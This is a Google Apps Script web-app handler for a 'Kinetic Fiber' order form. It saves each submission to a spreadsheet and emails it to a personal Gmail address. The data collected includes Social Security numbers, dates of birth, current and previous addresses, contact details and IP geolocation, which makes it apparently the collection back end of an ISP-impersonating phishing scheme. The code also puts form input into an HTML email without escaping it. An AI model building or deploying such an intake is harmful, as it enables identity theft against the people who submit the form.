const SHEET_NAME = "Kinetic Fiber Orders";
const NOTIFY_EMAIL = "gamblerspassion@gmail.com";
const TZ = "America/New_York";

function formatEstTimestamp(d) {
  // Forced "EST" suffix per your requirement
  return Utilities.formatDate(d, TZ, "MM/dd/yyyy hh:mm a") + " EST";
}

function sanitize(v) {
  return String(v ?? "").trim();
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents || "{}");
    const now = new Date();
    const submittedAt = formatEstTimestamp(now);

    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let sheet = ss.getSheetByName(SHEET_NAME);

    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      sheet.appendRow([
        "Submitted At (EST)",
        "Plan",
        "First Name",
        "Last Name",
        "DOB",
        "SSN",
        "Street Address",
        "Apt/Unit",
        "City",
        "State",
        "ZIP",
        "Phone",
        "Email",
        "Preferred Install Date",
        "Preferred Install Time",
        "Add-Ons",
        "Moved In Last Year?",
        "Prev Street",
        "Prev Apt",
        "Prev City",
        "Prev State",
        "Prev ZIP",
        "Source",
        "User Agent",
        "Geo Location (IP)"
      ]);
      sheet.setFrozenRows(1);
      sheet.getRange(1, 1, 1, 25).setFontWeight("bold");
    }

    sheet.appendRow([
      submittedAt,
      sanitize(data.plan),
      sanitize(data.firstName),
      sanitize(data.lastName),
      sanitize(data.dob),
      sanitize(data.ssn),
      sanitize(data.streetAddress),
      sanitize(data.aptUnit),
      sanitize(data.city),
      sanitize(data.state),
      sanitize(data.zip),
      sanitize(data.phone),
      sanitize(data.email),
      sanitize(data.preferredInstallDate),
      sanitize(data.preferredInstallTime),
      sanitize(data.addOns),
      sanitize(data.movedInLastYear),
      sanitize(data.previousStreetAddress),
      sanitize(data.previousAptUnit),
      sanitize(data.previousCity),
      sanitize(data.previousState),
      sanitize(data.previousZip),
      sanitize(data.source),
      sanitize(data.userAgent),
      sanitize(data.geoLocation)
    ]);

    const customerName = `${sanitize(data.firstName)} ${sanitize(data.lastName)}`.trim();
    const subject = `New Kinetic Order - ${customerName || "Unknown"} - ${sanitize(data.plan) || "No Plan"}`;

    const htmlBody = `
      <div style="margin:0;padding:0;background:#f3f6fb;font-family:Arial,Helvetica,sans-serif;color:#111827;">
        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background:#f3f6fb;padding:24px 0;">
          <tr>
            <td align="center">
              <table role="presentation" width="680" cellspacing="0" cellpadding="0" style="max-width:680px;background:#ffffff;border-radius:12px;overflow:hidden;border:1px solid #e5e7eb;">
                <tr>
                  <td style="background:linear-gradient(135deg,#0a0f3d 0%,#0175ca 100%);padding:20px 24px;color:#ffffff;">
                    <div style="font-size:22px;font-weight:800;line-height:1.2;">Kinetic Fiber - New Order</div>
                    <div style="margin-top:6px;font-size:13px;opacity:.9;">Submitted: ${submittedAt}</div>
                  </td>
                </tr>
                <tr>
                  <td style="padding:20px 24px;">
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
                      ${row("Plan", sanitize(data.plan))}
                      ${row("Name", customerName)}
                      ${row("DOB", sanitize(data.dob))}
                      ${row("Soc-Sec", sanitize(data.ssn))}
                      ${row("Phone", sanitize(data.phone))}
                      ${row("Email", sanitize(data.email))}
                      ${row("Address", `${sanitize(data.streetAddress)} ${sanitize(data.aptUnit) ? "#" + sanitize(data.aptUnit) : ""}, ${sanitize(data.city)}, ${sanitize(data.state)} ${sanitize(data.zip)}`)}
                      ${row("Install Date", sanitize(data.preferredInstallDate))}
                      ${row("Install Time", sanitize(data.preferredInstallTime))}
                      ${row("Add-Ons", sanitize(data.addOns))}
                      ${row("Moved In Last Year", sanitize(data.movedInLastYear))}
                      ${row("Previous Address", `${sanitize(data.previousStreetAddress)} ${sanitize(data.previousAptUnit) ? "#" + sanitize(data.previousAptUnit) : ""}, ${sanitize(data.previousCity)}, ${sanitize(data.previousState)} ${sanitize(data.previousZip)}`.replace(/^,\s*,\s*$/, ""))}
                      ${row("Geo Location (IP)", sanitize(data.geoLocation))}
                    </table>

                    <div style="margin-top:20px;padding:12px 14px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;font-size:12px;color:#374151;">
                      <div><strong>Source:</strong> ${sanitize(data.source)}</div>
                      <div style="margin-top:6px;"><strong>User Agent:</strong> ${sanitize(data.userAgent)}</div>
                      <div style="margin-top:10px;"><a href="${ss.getUrl()}" style="color:#0175ca;text-decoration:none;font-weight:700;">Open Google Sheet</a></div>
                    </div>
                  </td>
                </tr>
                <tr>
                  <td style="padding:14px 24px;background:#f9fafb;border-top:1px solid #e5e7eb;color:#6b7280;font-size:11px;">
                    Automated message from Kinetic Fiber lead intake.
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      </div>
    `;

    const textBody = [
      "Kinetic Fiber - New Order",
      `Submitted: ${submittedAt}`,
      "",
      `Plan: ${sanitize(data.plan)}`,
      `Name: ${customerName}`,
      `DOB: ${sanitize(data.dob)}`,
      `Soc-Sec: ${sanitize(data.ssn)}`,
      `Phone: ${sanitize(data.phone)}`,
      `Email: ${sanitize(data.email)}`,
      `Address: ${sanitize(data.streetAddress)} ${sanitize(data.aptUnit) ? "#" + sanitize(data.aptUnit) : ""}, ${sanitize(data.city)}, ${sanitize(data.state)} ${sanitize(data.zip)}`,
      `Install Date: ${sanitize(data.preferredInstallDate)}`,
      `Install Time: ${sanitize(data.preferredInstallTime)}`,
      `Add-Ons: ${sanitize(data.addOns)}`,
      `Moved In Last Year: ${sanitize(data.movedInLastYear)}`,
      `Geo Location (IP): ${sanitize(data.geoLocation)}`,
      `Source: ${sanitize(data.source)}`,
      "",
      `Sheet: ${ss.getUrl()}`
    ].join("\n");

    MailApp.sendEmail({
      to: NOTIFY_EMAIL,
      subject,
      body: textBody,
      htmlBody
    });

    return ContentService
      .createTextOutput(JSON.stringify({ status: "ok" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet() {
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ready" }))
    .setMimeType(ContentService.MimeType.JSON);
}

function row(label, value) {
  return `
    <tr>
      <td style="padding:10px 8px;border-bottom:1px solid #f1f5f9;width:170px;font-size:13px;color:#6b7280;font-weight:700;vertical-align:top;">
        ${label}
      </td>
      <td style="padding:10px 8px;border-bottom:1px solid #f1f5f9;font-size:14px;color:#111827;vertical-align:top;">
        ${value || "-"}
      </td>
    </tr>
  `;
}
